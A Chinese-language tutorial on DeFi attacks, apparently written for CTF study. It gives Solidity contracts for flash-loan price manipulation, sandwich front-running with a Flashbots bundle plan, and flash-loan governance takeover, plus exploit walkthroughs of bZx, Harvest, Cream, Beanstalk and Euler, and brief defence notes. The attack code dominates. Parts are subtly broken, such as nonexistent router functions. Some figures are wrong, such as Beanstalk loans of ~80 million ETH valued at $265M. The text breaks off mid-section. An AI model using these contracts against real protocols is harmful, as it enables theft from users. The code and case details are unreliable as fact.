# DeFi 攻击

## 原理

DeFi（去中心化金融）协议因价格预言机操纵、闪电贷攻击、MEV 等问题被攻击，导致资金损失。

## 常见攻击类型

### 1. 闪电贷攻击

```solidity
// 闪电贷：无需抵押的借贷，需在同一交易内还款
// 攻击者利用闪电贷操纵价格

// 攻击流程
// 1. 闪电贷借入大量代币
// 2. 操纵价格（如 DEX 价格）
// 3. 利用操纵的价格获利
// 4. 还款，保留利润

contract FlashLoanAttack {
    function attack() external {
        // 1. 闪电贷借入 10000 ETH
        aave.flashLoan(address(this), ETH, 10000 ether, "");
        
        // 2. 在 DEX 上卖出，压低价格
        dex.swap(ETH, USDC, 5000 ether);
        
        // 3. 利用低价格从目标协议获利
        target.borrow(1000000 USDC);  // 基于操纵的价格
        
        // 4. 在 DEX 上买回 ETH
        dex.swap(USDC, ETH, 1000000 USDC);
        
        // 5. 还款
        aave.transfer(ETH, 10000 ether);
    }
}
```

### 2. 价格预言机操纵

```solidity
// 漏洞：使用 DEX 价格作为预言机
contract Vulnerable {
    function getPrice() public view returns (uint) {
        // 漏洞：使用单一 DEX 的瞬时价格
        (uint r0, uint r1, ) = pair.getReserves();
        return r1 * 1e18 / r0;
    }
    
    function borrow(uint amount) public {
        uint price = getPrice();
        require(collateral * price >= amount, "Insufficient collateral");
        // ...
    }
}

// 攻击者通过大额交易操纵价格
```

### 3. MEV 攻击（三明治攻击）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "@aave/v3-core/contracts/interfaces/IPoolAddressesProvider.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

/// @title MEV Sandwich Attack PoC
/// @notice 三明治攻击：前置tx抬高价格，受害者tx滑点受损，后置tx卖出获利
contract SandwichAttacker is FlashLoanSimpleReceiverBase {
    IUniswapV2Router02 public immutable router;
    address public immutable pair;
    address public immutable token; // 目标代币
    uint256 public profit;

    constructor(
        address _provider,
        address _router,
        address _token
    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_provider)) {
        router = IUniswapV2Router02(_router);
        token = _token;
        pair = IUniswapV2Factory(router.factory())
            .getPair(address(this), _token); // WETH-token pair
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "Caller must be POOL");
        require(initiator == address(this), "Initiator must be attacker");

        // === 前置交易（Front-run）===
        // 大量卖出 token，压低价格
        // 1. 如果我们拿到了 token（模拟受害者交易方向的前置）
        //    或者大量买入 token 抬高价格（如果受害者是买入）
        (uint256 amountIn, uint256 amountOut) = _parseParams(params);

        // 前置：买入 token 抬高价格
        router.swapExactTokensForTokens(
            amount,
            0, // 模拟无滑点保护的受害者
            router.getPathForSwapping(asset, token),
            address(this),
            block.timestamp
        );

        // === 此处受害者交易以更高价格成交 ===
        // 受害者的 tx 在 mempool 中被看到，我们的 tx 包裹其前后

        // === 后置交易（Back-run）===
        // 卖出 token 获利（价格已被受害者进一步推高或维持高位）
        uint256 balance = IERC20(token).balanceOf(address(this));
        router.swapExactTokensForTokens(
            balance,
            amount, // 至少收回借入的金额 + premium
            router.getPathForSwapping(token, asset),
            address(this),
            block.timestamp
        );

        // 还款给 Aave
        IERC20(asset).approve(address(POOL), amount + premium);
        return true;
    }

    /// @notice 执行攻击入口
    function attack(
        address flashToken,
        uint256 flashAmount,
        uint256 swapAmount,
        bytes memory swapPath
    ) external {
        // 闪电贷借入资金
        pool.flashLoanSimple(
            address(this),
            flashToken,
            flashAmount,
            abi.encode(swapAmount, swapPath),
            0 // referralCode
        );
    }

    function _parseParams(bytes calldata data) 
        internal pure returns (uint256, uint256) 
    {
        return abi.decode(data, (uint256, uint256));
    }
}
```

```solidity
// === Mempool 监控脚本（Foundry/JS 概念） ===
// 1. 监听 pendingTransactions（eth_subscribe "newPendingTransactions"）
// 2. 解析目标 DEX Router 的 swap 调用
// 3. 提取 swap 金额和路径
// 4. 计算最优前置交易金额（使受害者滑点最大化）
// 5. 构造 front-run tx：gasPrice = victim_gasPrice + 1 gwei
// 6. 构造 back-run tx：gasPrice = victim_gasPrice - 1 gwei
// 7. 通过 Flashbots bundle 提交（避免被其他 MEV bot 竞争）

// Flashbots bundle 示例：
// const bundle = [{ signedTransaction: frontRunTx }, { signedTransaction: victimTx }, { signedTransaction: backRunTx }];
// await flashbots.sendBundle(bundle, targetBlockNumber);
```

### 4. 清算攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./interfaces/ILendingPool.sol";

/// @title Liquidation Bot PoC
/// @notice 清算机器人：监控不健康仓位，通过闪电贷完成清算并获取奖励
contract LiquidationBot {
    ILendingPool public immutable lendingPool;
    address public immutable weth;

    // 清算条件：healthFactor < 1.0
    // 清算奖励：通常 5-15% 折扣

    event Liquidation(
        address indexed user,
        address indexed collateral,
        address indexed debt,
        uint256 debtRepaid,
        uint256 collateralSeized,
        uint256 profit
    );

    constructor(address _lendingPool, address _weth) {
        lendingPool = ILendingPool(_lendingPool);
        weth = _weth;
    }

    /// @notice 批量清算不健康仓位
    function batchLiquidate(
        address[] calldata users,
        address[] calldata debtAssets,
        address[] calldata collateralAssets
    ) external {
        for (uint256 i = 0; i < users.length; i++) {
            try this.liquidate(
                users[i],
                debtAssets[i],
                collateralAssets[i]
            ) {} catch {}
        }
    }

    /// @notice 单笔清算
    function liquidate(
        address user,
        address debtAsset,
        address collateralAsset
    ) external returns (uint256 profit) {
        // 1. 检查仓位是否可清算
        (bool isHealth, uint256 healthFactor) = 
            lendingPool.getUserAccountData(user);
        require(!isHealth && healthFactor < 1e18, "Position healthy");

        // 2. 获取可清算的最大债务金额
        (uint256 maxDebt, uint256 collateralAmount) = 
            lendingPool.getLiquidationData(user, debtAsset, collateralAsset);

        // 3. 闪电贷借入债务代币
        // 用闪电贷借入 debtAsset 用于偿还用户债务
        uint256 debtRepaid = _flashLoanAndLiquidate(
            user, debtAsset, collateralAsset, maxDebt, collateralAmount
        );

        // 4. 在 DEX 上卖出 collateral 获取利润
        profit = _swapToProfit(collateralAsset, debtAsset, debtRepaid);

        emit Liquidation(user, collateralAsset, debtAsset, debtRepaid, collateralAmount, profit);
        return profit;
    }

    function _flashLoanAndLiquidate(
        address user,
        address debtAsset,
        address collateralAsset,
        uint256 maxDebt,
        uint256 collateralAmount
    ) internal returns (uint256) {
        // 通过 Aave 闪电贷借入 maxDebt 数量的 debtAsset
        // 调用 lendingPool.liquidationCall() 清算
        // 卖出 collateralAsset 还款
        // 保留差额作为利润

        uint256 debtDecimals = IERC20Metadata(debtAsset).decimals();
        uint256 collateralDecimals = IERC20Metadata(collateralAsset).decimals();

        // 清算调用：偿还 maxDebt 的债务，获得 collateralAsset 的抵押物
        // 抵押物 = maxDebt * (1 + liquidationBonus) * price_debt / price_collateral
        lendingPool.liquidationCall(
            collateralAsset,
            debtAsset,
            user,
            maxDebt,
            collateralAmount
        );

        return maxDebt;
    }

    function _swapToProfit(
        address from,
        address to,
        uint256 amount
    ) internal returns (uint256) {
        // 通过 1inch/Uniswap 将 collateral 换回 debtAsset
        // profit = amount_received - amount_borrowed - gas_cost
        return amount; // 简化
    }

    // === 价格操纵触发清算 ===
    // 攻击者流程：
    // 1. 找到大额抵押仓位（如 1000 ETH 抵押借出稳定币）
    // 2. 闪电贷借入大量 ETH
    // 3. 在 DEX 上抛售 ETH 压低价格
    // 4. 目标仓位 healthFactor < 1 → 触发清算
    // 5. 攻击者自己的清算机器人立即清算
    // 6. 以折扣价获得抵押物
    // 7. 买回 ETH 还款，保留差额
}
```

```solidity
// === 价格操纵 + 清算组合攻击 ===
/// @title Oracle Manipulation Liquidation Attack
/// @notice 通过操纵价格预言机触发清算，然后清算获利
contract OracleManipLiquidation {
    // 目标：使用单一 DEX 价格的借贷协议
    // 步骤：
    // 1. flashLoan(tokenA, largeAmount)
    // 2. router.swap(tokenA → tokenB, largeAmount) // 压低 tokenA 价格
    // 3. target.liquidationCall(victim, tokenA, tokenB, maxDebt, 0)
    //    // 因为 tokenA 价格暴跌，victim 仓位不健康，清算成功
    // 4. 获得大量 tokenA 抵押物（以折扣价）
    // 5. router.swap(tokenB → tokenA, repayAmount) // 买回少量 tokenA 还款
    // 6. 利润 = 抵扣折扣获得的 tokenA - 还款 tokenA
}
```

### 5. 治理攻击（闪电贷投票）

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@aave/v3-core/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";

interface IGovernanceToken {
    function getPastVotes(address account, uint256 blockNumber) 
        external view returns (uint256);
    function delegates(address account) external view returns (address);
    function delegate(address delegatee) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) 
        external returns (uint256);

    function queue(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external;

    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable returns (uint256);

    function state(uint256 proposalId) external view returns (uint8);
}

/// @title Governance Attack via Flash Loan
/// @notice Beanstalk 风格治理攻击：
///   在同一笔 tx 中借入治理代币 → 投票通过恶意提案 → 转移资金
contract GovernanceFlashAttack is FlashLoanSimpleReceiverBase {
    IGovernor public immutable governor;
    IGovernor public immutable beanstalk; // 目标 DAO

    constructor(
        address _poolProvider,
        address _governor,
        address _beanstalk
    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_poolProvider)) {
        governor = IGovernor(_governor);
        beanstalk = IGovernor(_beanstalk);
    }

    function executeGovernanceAttack(
        address governanceToken,
        uint256 flashAmount,
        address[] calldata proposalTargets,
        uint256[] calldata proposalValues,
        bytes[] calldata proposalCalldatas,
        string calldata proposalDescription,
        bytes32 descriptionHash
    ) external {
        // 1. 闪电贷借入大量治理代币
        pool.flashLoanSimple(
            address(this),
            governanceToken,
            flashAmount,
            abi.encode(
                proposalTargets,
                proposalValues,
                proposalCalldatas,
                proposalDescription,
                descriptionHash
            ),
            0
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // 2. 解码恶意提案参数
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory calldatas,
            string memory description,
            bytes32 descriptionHash
        ) = abi.decode(params, (address[], uint256[], bytes[], string, bytes32));

        // 3. 委托投票权给自己（必须在同一区块内）
        IGovernanceToken(asset).delegate(address(this));

        // 4. 提交恶意提案（如果尚未存在）
        uint256 proposalId = governor.propose(
            targets, values, calldatas, description
        );

        // 5. 投票支持（拥有闪电贷借来的大量投票权）
        // 注意：某些协议使用 getPastVotes，需要在前一个区块持有代币
        // 这种情况下需要跨区块操作（2-tx 攻击）
        governor.castVote(proposalId, 1); // 1 = For

        // 6. 排队并执行（跳过 timelock 或 timelock 极短）
        // 某些协议如 Beanstalk 的 timelock 可以被绕过
        governor.queue(targets, values, calldatas, descriptionHash);
        governor.execute(targets, values, calldatas, descriptionHash);

        // 7. 还款
        IERC20(asset).approve(address(POOL), amount + premium);
        return true;
    }
}

// === Beanstalk 攻击详解 ===
// BIP-18/BIP-19 攻击（2022年4月，损失 ~1.82亿美元）
// 1. 攻击者创建恶意提案：将社区资金转入攻击者地址
// 2. 从 Aave/DODO 闪电贷借入:
//    - ~3.5B BEAN（治理代币）
//    - ~1B LUSD
//    - ~32M USDC  
//    - ~11.6M USDT
//    - ~57M DAI
// 3. 将稳定币在 Curve 上换成 BEAN 和 3CRV
// 4. 用 BEAN 投票通过 BIP-18（将资金转入攻击者）
// 5. 用 3CRV 投票通过 BIP-19（进一步转移）
// 6. 资金到达攻击者地址
// 7. 归还闪电贷
// 关键：Beanstalk 没有 timelock，提案通过后立即执行
```

## 经典案例

### 1. bZx 攻击（2020.02）— 损失 ~1000 ETH

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title bZx Flash Loan Exploit PoC
/// @notice 第一次 DeFi 闪电贷攻击：利用 bZx + Kyber 价格操纵
/// @dev 实际攻击发生在 2020.02.14，攻击者用 10000 ETH 闪电贷获取 ~1000 ETH 利润
///
/// 攻击原理：
/// bZx (fulcrum) 允许用户用 ETH 抵押借出 sUSD，然后在 Kyber 上卖出 sUSD 换 ETH
/// Kyber 的 sUSD/ETH 池流动性极低，大额卖出导致 sUSD 价格暴跌
/// 攻击者通过 bZx 的杠杆功能，以极低抵押率借出了远超正常水平的 sUSD
/// 然后在 Kyber 上卖出，由于价格操纵获得了异常高的 ETH 回报
///
/// 第二笔攻击（同日）：
/// 借入 7056 ETH → 在 bZx 抵押借出 6796 ETH 的 wBTC → 在 Uniswap 卖出 wBTC
contract BZxExploit {
    // 攻击流程伪代码（实际需要与 bZx v1 和 Kyber 合约交互）
    //
    // 1. 从 dYdX 闪电贷借入 10,000 ETH
    //
    // 2. 将 5,500 ETH 存入 bZx 作为抵押品
    //    bZx.marginTrade(
    //        0,                    // relayId
    //        0x5...sUSD,           // collateralToken (ETH)
    //        0x5...sUSD,           // loanToken (sUSD)
    //        0x5...ETH,            // collateralToken (ETH, bZx将ETH转为sUSD)
    //        5500 ether,           // collateralAmount
    //        10 ether,             // leverageAmount (极低杠杆即可借出大量)
    //        0                     // tradeDataToSrc (使用默认路径)
    //    )
    //    → 通过 bZx 获得 ~675 sUSD (但实际可借远超此数)
    //
    // 3. 将剩余 4,500 ETH 通过 Kyber 交换为 ~6871 sUSD
    //    KyberNetworkProxy.trade(
    //        0x5...sUSD,   // sellToken (ETH)
    //        4500 ether,   // sellAmount
    //        0x5...ETH,    // buyToken (sUSD)
    //        attacker,     // profile
    //        2**256 - 1,   // maxDestinationAmount (无上限)
    //        0,            // minConversionRate (无下限 — 关键漏洞)
    //        0x0000        // hint
    //    )
    //    → 因为 Kyber sUSD 池深度不足，大量 sUSD 被买入推高价格
    //    → 实际获得的 sUSD 数量远超预期
    //
    // 4. 在 bZx 上用全部 sUSD 借出 ETH（反向操作）
    //    bZx.marginTrade(
    //        ...,
    //        sUSD,          // collateralToken
    //        sUSD,          // loanToken
    //        ETH,           // 抵押物 → ETH
    //        all_sUSD,      // 全部 sUSD 作为抵押
    //        ...,           // 借出 ETH
    //    )
    //    → 因为步骤2+3操纵了 sUSD 的"价值"，借出的 ETH 远超存入的
    //
    // 5. 归还 10,000 ETH 闪电贷，剩余 ~1,000 ETH 为利润

    // === 关键教训 ===
    // - 单一 DEX 瞬时价格不安全（bZx 使用 Kyber 作为价格源）
    // - 低流动性池容易被操纵
    // - 闪电贷使攻击者无需自有资金即可执行大规模价格操纵
}
```

### 2. Harvest Finance 攻击（2020.10）— 损失 ~3400 万美元

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Harvest Finance Reentrancy-like Price Manipulation PoC
/// @notice 利用 Curve yUSD 池价格操纵 + Harvest 资产管理协议的价格计算差异
///
/// 攻击原理：
/// Harvest Finance 使用 Curve 池的价格来计算其 vault 的 share 价值
/// 攻击者在 Curve 池中大额存入/取出，暂时操纵 yUSD 价格
/// 然后在 Harvest 中反复存入/取出，利用价格差套利
///
/// 损失 ~3400 万美元（部分后被归还）
contract HarvestExploit {
    // 攻击流程：
    //
    // 1. 从 dYdX 闪电贷借入 ~$50M USDC + USDT
    //
    // 2. 第一轮操纵：
    //    a. 将大量 USDC 存入 Curve yUSD 池
    //       Curve.add_liquidity([large_USDC_amount, 0, 0, 0])
    //       → yUSD 价格被暂时推高（因为 USDC 比例过大）
    //
    //    b. 在 Harvest 中存入 USDC（此时 yUSD 价格偏高）
    //       Harvest.deposit(usdcAmount)
    //       → 获得的 share 数量基于被操纵的高价格 → share 偏少
    //
    //    c. 从 Curve 取回流动性（恢复/降低 yUSD 价格）
    //       Curve.remove_liquidity_one_coin(lpAmount, 0) // 取回 USDC
    //       → yUSD 价格回落
    //
    //    d. 从 Harvest 取出资金（此时价格偏低 → 获得更多 USDC）
    //       Harvest.withdraw(shares)
    //       → 因为 yUSD 价格已降低，取回的 USDC > 存入的 USDC
    //
    // 3. 重复步骤 2a-2d 多次（约 17 轮），每轮利润约 50-100 万美元
    //
    // 4. 归还闪电贷

    // === 曲线池价格操纵细节 ===
    // Curve yUSD Pool 包含：USDC, USDT, DAI, yUSD
    // yUSD 是 Yearn Finance 的收益聚合器代币
    //
    // 当大量 USDC 存入 Curve 池时：
    // - USDC 在池中的比例上升
    // - yUSD 的隐含价格上升（因为曲线不变量）
    // - 但实际 yUSD 的内在价值不变
    //
    // Harvest 使用此隐含价格计算 vault 份额：
    // sharePrice = totalAssets / totalSupply
    // 当价格被操纵时，存入/取出的 share 数量与实际价值不匹配

    // === 防护 ===
    // - 使用 TWAP 而非瞬时价格
    // - 添加 reentrancy guard（虽然不是经典重入，但效果类似）
    // - 限制单次存取金额或添加时间锁
    // - 检测同一区块内的存取操作
}
```

### 3. Cream Finance 攻击（2021.10）— 损失 ~1.3 亿美元

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Cream Finance (Iron Bank) Exploit PoC
/// @notice 利用 Yearn v1 vault 的 ERC20 无返回值 approve 漏洞进行重入攻击
///
/// 攻击原理：
/// Cream Finance 与 Yearn v1 vault 集成，用于计算抵押品价值
/// Yearn v1 vault 的 approve() 函数不返回 bool（不符合 ERC20 标准）
/// Cream 的借贷合约调用 approve() 后，Yearn vault 通过外部调用回调
/// 攻击者在回调中重入，反复借出更多资金
///
/// 损失 ~1.3 亿美元（2021 年 10 月 27 日）
/// 同一攻击者此前在 2021 年 2 月已用类似手法盗取 ~3700 万美元
contract CreamExploit {
    // === 核心漏洞：Yearn v1 yDAI vault 的 ERC20 approve 重入 ===
    //
    // Yearn v1 Vault 代码 (简化)：
    // function approve(address _spender, uint256 _amount) public {
    //     // 注意：不返回 bool，但使用 IERC20 接口调用
    //     // 当通过底层 token 的 approve 调用时触发外部调用
    //     IERC20(token).approve(spender, amount);
    //     // ERC677/ERC777 代币在这里会触发 tokenTransfer Hook
    // }
    //
    // Cream 的 add_liquidity 调用路径：
    // 1. Cream 调用 yDAI.approve(spender, amount)
    // 2. yDAI vault 内部调用 DAI.approve(spender, amount)
    // 3. 如果 DAI 是 ERC777 代币，触发 tokenReceived() 回调
    // 4. 攻击者的 tokenReceived() 中重入 Cream
    // 5. 重复步骤 1-4，每次借出更多资金

    // === 攻击流程 ===
    //
    // 1. 部署攻击合约，内置重入逻辑
    //
    // 2. 闪电贷借入初始资金（约 500 ETH）
    //
    // 3. 在 Cream 中存入少量 yDAI 作为初始抵押
    //    creamOracle.setOwnedPrice(yDAI, manipulatedPrice)
    //
    // 4. 从 Cream 借出 ETH
    //    cream.borrow(ETH, borrowAmount)
    //    → borrow 内部调用 collateral.approve() 触发重入
    //
    // 5. 在重入回调中：
    //    - 再次调用 cream.borrow()
    //    - 此时账户中已有借出的 ETH（尚未结算？）
    //    - 或通过操纵的 oracle 显示更高的抵押价值
    //    - 继续借出更多 ETH
    //
    // 6. 重复借出直到 Cream 池中 ETH 耗尽
    //
    // 7. 归还闪电贷，保留所有盗取的 ETH

    // === 2021年2月的攻击 ===
    // 同一攻击者使用 yDAI 和 yUSDT vault 的相同漏洞
    // 利用 Cream 的 "借出" 功能在没有足够抵押的情况下反复借出
    // 损失 ~3700 万美元
    //
    // === 2021年10月的攻击 ===
    // 攻击者利用相同原理但不同的触发路径
    // 涉及 13 种不同资产的 ERC677 代币
    // 损失 ~1.3 亿美元
    // 闪电贷来源：Alpha Homora（间接通过 bZx 闪电贷）
}
```

### 4. Beanstalk 攻击（2022.04）— 损失 ~1.82 亿美元

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Beanstalk Governance Attack PoC
/// @notice 闪电贷 + 治理投票攻击：在同一笔交易中借入治理代币并通过恶意提案
///
/// 攻击原理：
/// Beanstalk DAO 使用链上治理，提案投票权基于 BEAN 代币余额
/// 没有 timelock（或 timelock 可被绕过），提案通过后立即执行
/// 攻击者用闪电贷借入巨额 BEAN，在同一区块内投票并执行恶意提案
///
/// BIP-18：将 Beanstalk 地址的所有资金转移到攻击者合约
/// BIP-19：进一步转移剩余资金
///
/// 损失 ~1.82 亿美元（2022 年 4 月 17 日）
/// 攻击者事后归还了部分资金（~3300 万美元）
contract BeanstalkExploit {
    // === 攻击详细流程 ===
    //
    // 闪电贷来源（同时从多个协议借入）：
    //   - Aave v2:     ~80,745,178 ETH (约 $265M)
    //   - DODO:        ~65,393,098 ETH (约 $215M)
    //   - Sushiswap:   40,000,000 BEAN
    //   - Balancer:    ~32,155,351 DAI + 41,634,327 USDC + 56,717,043 USDT
    //   - Uniswap:     ~5,061,524 LUSD
    //
    // 步骤 1: 在 Curve 3pool 中将稳定币换成 BEAN
    //   Curve.add_liquidity([DAI, USDC, USDT], amounts)
    //   → 获得 3CRV LP token
    //   Curve.exchange(3CRV → BEAN, amount)
    //   → 获得大量 BEAN
    //
    // 步骤 2: 从 Sushiswap 直接获取 BEAN
    //   Sushi.swap(EXACT_INPUT, [ETH → BEAN], amount)
    //
    // 步骤 3: 在 Uniswap 上购买 BEAN
    //   Uniswap.swap(EXACT_INPUT, [LUSD → BEAN], amount)
    //
    // 步骤 4: 此时攻击者持有约 ~2,000,000,000 BEAN（20亿）
    //   占 BEAN 总供应量的绝大多数
    //
    // 步骤 5: 委托投票权
    //   BEAN.delegate(address(this))
    //   → 因为持有几乎所有 BEAN，获得压倒性投票权
    //
    // 步骤 6: 提交并立即投票通过 BIP-18
    //   Beanstalk.propose(targets, values, calldatas, "BIP-18")
    //   → 恶意提案内容：调用 Beanstalk.withdraw() 将资金转给攻击者
    //   Beanstalk.castVote(proposalId, 1)  // 1 = For
    //   → 100% 投票通过
    //
    // 步骤 7: 提交并投票通过 BIP-19
    //   → 更多资金转移操作
    //
    // 步骤 8: 队列并执行（Beanstalk 没有 timelock 保护）
    //   Beanstalk.queue(proposalId, eta)
    //   Beanstalk.execute(proposalId)
    //   → ~$182M 资金转移到攻击者地址
    //
    // 步骤 9: 归还所有闪电贷

    // === 关键漏洞 ===
    // 1. 治理机制允许闪电贷投票（没有 "past balance" 检查或检查不够）
    // 2. 没有 timelock — 提案通过后立即执行
    // 3. 没有 quorum 保护 — 少量代币持有者即可通过提案
    // 4. 没有紧急暂停机制

    // === 防护 ===
    // - 实施 timelock（至少 48 小时延迟）
    // - 检查 proposal 创建前的 past balance（跨区块持有要求）
    // - 设置 quorum 最低要求
    // - 多签紧急暂停机制
    // - 限制提案可调用的函数范围
}
```

### 5. Euler Finance 攻击（2023.03）— 损失 ~1.97 亿美元

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Euler Finance Exploit PoC
/// @notice 利用 EToken donates() + 多重借贷漏洞进行闪电贷攻击
///
/// 攻击原理：
/// Euler Finance 有一个 donateToReserves() 函数允许用户捐赠代币
/// 捐赠后会减少用户的 balance 但不减少 debt，导致 healthFactor 异常
/// 攻击者利用此函数在借出后捐赠，使自己的仓位"名义上"更健康
/// 然后再次借出更多资金，反复循环
///
/// 损失 ~$197M（2023年3月13日）
/// 攻击者最终归还了所有资金（2023年4月）
/// 闪电贷来源：Aave v2
contract EulerExploit {
    // === 核心漏洞函数 ===
    //
    // Euler EToken 合约中的 donateToReserves：
    // function donateToReserves(uint256 _id, uint256 _amount) external {
    //     ETokenPreSwap儲存position
    //     uint256 donation = _amount > userBalance ? userBalance : _amount;
    //     userBalances[_id][msg.sender] -= donation;
    //     totalReserves += donation;
    //     // 注意：这减少了余额但没有减少债务
    //     // healthFactor = (collateral * liquidationThreshold) / totalDebt
    //     // 减少余额使抵押品价值下降，但捐赠的代币不再受保护
    //     // → 可以被其他人清算获取
    // }
    //
    // 问题：donateToReserves 不检查用户的健康状态
    // 且捐赠后的代币进入了 "不受保护" 的 reserve
    // 攻击者可以：借出 → 损赠 → 再借出 → 循环

    // === 攻击流程 ===
    //
    // 1. 从 Aave v2 闪电贷借入 ~30,000,000 DAI
    //
    // 2. 将 DAI 存入 Euler 以获得 eDAI (EToken)
    //    euler.supply(0, DAI, 30_000_000 ether)
    //    → 获得 eDAI 存款凭证
    //
    // 3. 借出 DAI（使用 eDAI 作为抵押）
    //    euler.borrow(0, DAI, borrowAmount)
    //    → 借出约 19,400,000 DAI（约为存款的 2x 杠杆）
    //
    // 4. 利用漏洞：通过 swap 在 Euler DToken 市场操控
    //    euler.swap(0, DAI, amount, ...) 
    //    → 在 DTokens 市场进行额外操作
    //
    // 5. 调用 donateToReserves() 捐赠部分 eDAI
    //    euler.donateToReserves(0, donationAmount)
    //    → 减少自己的 eDAI 余额，但不减少债务
    //    → 实际上将这些代币变为 "无主" 状态
    //
    // 6. 通过清算操作获取利润
    //    euler.liquidate(attacker, 0, DAI, ..., liquidationAmount)
    //    → 清算自己的 "不健康" 仓位
    //    → 以折扣价获得抵押物
    //
    // 7. 重复步骤 3-6 多次（利用 Euler 支持的多重市场）
    //    → 在多个 eToken 市场之间转移和套利
    //
    // 8. 将所有获得的代币通过 DEX 换回 DAI
    //
    // 9. 归还 30,000,000 DAI 闪电贷
    //    剩余 ~197,000,000 DAI 为利润

    // === 攻击变体：跨市场操纵 ===
    // Euler 支持多种代币市场（DAI, USDC, WBTC, stETH 等）
    // 攻击者可以在一个市场存款 → 借出 → 在另一个市场套利
    // 利用多个市场之间的价格差异和清算机制
    //
    // 实际攻击使用了以下市场：
    // - eDAI/dDAI (存款/借贷 DAI)
    // - eUSDC/dUSDC
    // - eWBTC/dWBTC
    // - eWETH/dWETH
    // - eLUSL/stETH 等

    // === 闪电贷来源与资金流 ===
    // Aave v2 → 30M DAI → Euler 多市场操作 → ~197M DAI 利润
    // 为什么是 197M 而不是 30M？
    // 因为攻击者通过漏洞实际上"凭空"创造了借贷能力
    // Euler 池中原本有大量其他用户的存款
    // 攻击者通过操纵健康因子，将这些存款"借出"
}
```

## 防护方法

### 1. 使用时间加权平均价格（TWAP）

```solidity
// 使用 Uniswap V3 TWAP
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

function getPrice() public view returns (uint) {
    // 使用 TWAP 而非瞬时价格
    (int24 tick, ) = pool.slot0();
    // 计算时间加权平均
}
```

### 2. 使用多个预言机

```solidity
// 使用 Chainlink + Uniswap TWAP
function getPrice() public view returns (uint) {
    uint chainlinkPrice = getChainlinkPrice();
    uint twapPrice = getTWAPPrice();
    require(
        chainlinkPrice * 99 / 100 <= twapPrice &&
        twapPrice <= chainlinkPrice * 101 / 100,
        "Price deviation too large"
    );
    return (chainlinkPrice + twapPrice) / 2;
}
```

### 3. 闪电贷防护

```solidity
// 1. 检查 block.number 变化
// 2. 限制单笔交易金额
// 3. 使用承诺-揭示方案
```

### 4. MEV 防护

```solidity
// 1. 使用私有 mempool（Flashbots）
// 2. 使用滑点保护
// 3. 使用 MEV-Share
```

## 2024-2026 新技术点

### 1. 跨链桥攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Cross-Chain Bridge Exploit Patterns
/// @notice 跨链桥是最大攻击目标（2022-2026 年累计损失超 $25亿）

// === 模式一：签名验证绕过（Wormhole 风格） ===
// 2022 Wormhole 攻击（$326M）：验证者签名伪造
// 2024 仍有变种出现
//
// 攻击者构造虚假的跨链消息：
// bytes memory fakeMessage = abi.encode(
//     sourceChainId,        // 伪造源链ID
//     nonce,                // 伪造 nonce
//     recipient,            // 攻击者地址
//     token,                // 目标代币
//     amount                // 巨额数量
// );
// // 伪造足够的验证者签名（当验证者集合被入侵时）
// bytes[] memory signatures = _forgeSignatures(fakeMessage, compromisedKeys);

// === 模式二：预言机操纵（Ronin Bridge 风格） ===
// 2022 Ronin 攻击（$625M）：5/9 验证者被入侵
// 2024 类似模式：通过社会工程入侵多数验证者

// === 模式三：消息重放 ===
// 跨链消息在源链和目标链都可读取
// 攻击者将已在目标链执行过的消息重新提交
// 防护：nonce + chainId 绑定

// === 模式四：流动性池操纵（Harmony Horizon 风格） ===
// 跨链桥在目标链上铸造/释放代币
// 如果释放逻辑依赖可操纵的价格 → 闪电贷攻击

// === 2024-2026 实际案例 ===
// - 2024.01: Socket 聚合器被攻击 ~$3.3M（权限漏洞）
// - 2024.04: Cross-Chain Bridge Nomad 的后续攻击
// - 2024: 多个 L2 → L1 桥的消息验证漏洞
// - 2025: 跨链消息的 gas 竞争攻击

// === CTF 常见考法 ===
// 1. 给定简化版桥合约，找到签名验证中的 ECDSA 恢复漏洞
// 2. 找到 nonce 管理中的重放漏洞
// 3. 利用链 ID 不匹配进行跨链消息伪造
// 4. 通过伪造 relayer 凭证在目标链提取资金
```

### 2. Layer 2 攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Layer 2 Attack Patterns (Optimistic + ZK Rollups)

// === Optimistic Rollup 攻击 ===
// 1. Fraud Proof 竞争攻击
//    - 攻击者提交恶意交易
//    - 监控者需在挑战期内提交欺诈证明
//    - 如果挑战期太短或监控者不在线 → 攻击成功
//    - 2024: 某些项目 7 天挑战期太短
//
// 2. Sequencer 中心化攻击
//    - Sequencer 是单点故障
//    - 攻击者入侵 Sequencer → 可排序/审查交易
//    - 2024: 大多数 L2 的 Sequencer 仍是中心化
//
// 3. 桥接漏洞
//    L1→L2 消息通过 Optimistic Bridge
//    如果 L1 上的合约可以发送任意 L2 消息
//    攻击者在 L2 上伪造存款

// === ZK Rollup 攻击 ===
